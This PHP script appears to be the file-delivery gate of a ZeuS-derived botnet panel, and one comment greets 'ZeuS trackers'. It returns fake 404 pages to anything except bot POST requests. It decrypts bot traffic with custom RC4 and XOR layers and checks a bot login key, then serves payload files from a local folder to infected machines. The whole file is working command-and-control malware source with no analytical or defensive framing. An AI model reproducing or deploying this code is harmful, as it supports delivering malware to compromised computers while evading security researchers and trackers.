<?php define('__REPORT__', 1);

define('FILEPHP_DEBUG_MODE', 0); # DEBUG MODE. Logs into intergate.php.log (if exists)

# PHP Error settings
ini_set('error_log', basename(__FILE__).'.error.log'); # Log everything to intergate.php.error.log
ini_set('log_errors', 1);
ini_set('display_errors', 0); # don't display errors: this can spoil the protocol
ini_set('ignore_repeated_errors', 1);
ini_set('html_errors', 0);
error_reporting(E_ALL);

# Includes
require_once('intergate_config.php');

function die404($place, $reason, $text = ''){
	$sapi_name = php_sapi_name();
	if ($sapi_name == 'cgi' || $sapi_name == 'cgi-fcgi')
		@header('Status: 404 Not Found');
	else
		@header($_SERVER['SERVER_PROTOCOL'] . ' 404 Not Found');
		
	echo ($text);
	
	if(FILEPHP_DEBUG_MODE)
	   @file_put_contents(__FILE__.".log", "[".date('m/d/Y h:i:s a', time())."] ".$place.": ".$reason."\r\n", FILE_APPEND);
	
    die();
}

function visualDecrypt(&$data)
{
  $len = strlen($data);
  if($len > 0)for($i = $len - 1; $i > 0; $i--)$data[$i] = chr(ord($data[$i]) ^ ord($data[$i - 1]));
}

function smartEncrypt(&$data, $key)
{
  $data_sz = strlen($data);
  $key_sz = strlen($key);

  $salt = BO_CRYPT_SALT;

  for ($i = 0; $i < $data_sz ; $i++)
    $data[$i] = chr(
      ord($data[$i]) ^
      ord($key[  $i%$key_sz  ]) ^
      (($salt >> (8*($i%4)) | $salt << (8*(4-($i%4)))) & 0xFF)
    );
}

function rc4(&$data, $key)
{
  $len = strlen($data);
  $loginKey = BO_LKEY;
  $loginKeyLen = strlen(BO_LKEY);
  for($z = $y = $x = $w = 0; $x < $len; $x++)
  {
    $z = ($z + 1) % 256;
    $y = ($y + $key[$z]) % 256;
    $tmp      = $key[$z];
    $key[$z]  = $key[$y];
    $key[$y]  = $tmp;
    $data[$x] = chr(ord($data[$x]) ^ ($key[(($key[$z] + $key[$y]) % 256)]));
    $data[$x] = chr(ord($data[$x]) ^ ord($loginKey[$w]));
    if (++$w == $loginKeyLen) $w = 0;
  }
}

if(@$_SERVER['REQUEST_METHOD'] !== 'POST')
{
  die404("init", "invalid REQUEST_METHOD('".@$_SERVER['REQUEST_METHOD']."').", "Not Found");
}

//Получаем данные.
$data     = @file_get_contents('php://input');
$dataSize = @strlen($data);
if($dataSize < HEADER_SIZE + ITEM_HEADER_SIZE)
{
  die404("init", "bad request data size ('".$dataSize."') bytes.");
}

if ($dataSize < BOTCRYPT_MAX_SIZE) rc4($data, $cryptkey);
visualDecrypt($data);
smartEncrypt($data, substr($data, 0, HEADER_PREFIX));

//Верефикация. Если совпадает MD5, нет смысла проверять, что-то еще.
if(strcmp(md5(substr($data, HEADER_SIZE), true), substr($data, HEADER_MD5, 16)) !== 0)
{
  die404("init", "bad request md5 signature (possible bad crypt key).");
}

//Парсим данные (Сжатие данных не поддерживается).
$list = array();
for($i = HEADER_SIZE; $i + ITEM_HEADER_SIZE <= $dataSize;)
{
  $k = @unpack('L4', @substr($data, $i, ITEM_HEADER_SIZE));
  $list[$k[1]] = @substr($data, $i + ITEM_HEADER_SIZE, $k[3]);
  $i += (ITEM_HEADER_SIZE + $k[3]);
}
unset($data);

//Основные параметры, которые должны быть всегда.
if(empty($list[SBCID_LOGIN_KEY]) || empty($list[SBCID_REQUEST_FILE]))
{
  die404("init", "empty request LKEY or FILENAME.");
}

//Проверяем ключ для входа. Привет ZeuS трекерам.
if(strcasecmp(trim($list[SBCID_LOGIN_KEY]), BO_LKEY) != 0)
{
  die404("init", "bad request LKEY ('".trim($list[SBCID_LOGIN_KEY])."').");
}

$requestfile = trim($list[SBCID_REQUEST_FILE]);

function loadfile($file){
  $cipher = false;
  
  $filename = './files/'.basename($file);
  if (!is_file($filename))
      return false;

  $len = filesize($filename);
  $file_extension = strtolower(substr(strrchr($filename,"."),1));
        
  header("Cache-Control:");
  header("Cache-Control: public");
  header("Content-Type: application/octet-stream");
  
  if (strstr($_SERVER['HTTP_USER_AGENT'], "MSIE")) {
    $iefilename = preg_replace('/\./', '%2e', $filename, substr_count($filename, '.') - 1);
    header("Content-Disposition: attachment; filename=\"$iefilename\"");
  } else {
    header("Content-Disposition: attachment; filename=\"$filename\"");
  }
  header('Content-Transfer-Encoding: binary');  
  header("Content-Length: ".$len);

  @ob_clean();
  flush();
  if (!$cipher)
    @readfile("$filename");
  else{
        $contents = file_get_contents($filename);
        rc4($contents, $cryptkey);
        echo $contents;
    }	
  return true;
}

$success = loadfile($requestfile);

if (!$success)
    die404("file", "load file ('".$requestfile."') failed.");

?>